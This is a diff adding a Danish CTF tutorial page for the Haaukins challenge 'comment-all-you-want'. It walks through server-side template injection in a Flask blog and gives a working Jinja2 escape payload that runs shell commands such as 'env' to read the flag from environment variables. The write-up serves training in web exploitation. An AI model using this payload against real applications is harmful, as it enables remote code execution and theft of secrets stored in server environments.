@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: comment-all-you-want — tutorial (SSTI → RCE)</title>
+<meta name="description" content="Guide til Haaukins comment-all-you-want: Server-Side Template Injection i en Flask-blog; Jinja2-escape til RCE og flaget i en miljøvariabel.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>comment-all-you-want</h1>
+<p class="subtitle">Server-Side Template Injection → kør Python på serveren.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>En Flask-blog renderer dine kommentarer. Hvis input går gennem Jinja2's
+             <code>render_template_string</code>, kan du injicere template-kode → RCE.</p>
+<h2>Trin for trin</h2>
+<pre><code>MARK{{7*7}}MARK      -> "MARK49MARK"   => SSTI (Jinja2)
+{{cycler.__init__.__globals__.os.popen('env').read()}}   # RCE som root -> FLAG=HKN{...}</code></pre>
+             <p><strong>Fælder:</strong> undgå <code>{ } " '</code> i din kommando (bryder Jinja-udtrykket) — brug
+             <code>env</code>, <code>cat /path</code>. Stored SSTI kan 'brick'e en side ved en malformet payload — brug
+             et frisk post, ét rent payload ad gangen. Flaget lå i en env-var, ikke en fil.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{...}</span> (per-instans; fundet via <code>env</code>).</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>{{7*7}}</code>→49 = SSTI-fingeraftryk.</li><li>Jinja2-escape: <code>{{cycler.__init__.__globals__.os.popen('cmd').read()}}</code>.</li><li>Hold kommandoer brace-/quote-fri; flaget i Flask-apps er tit en env-var.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
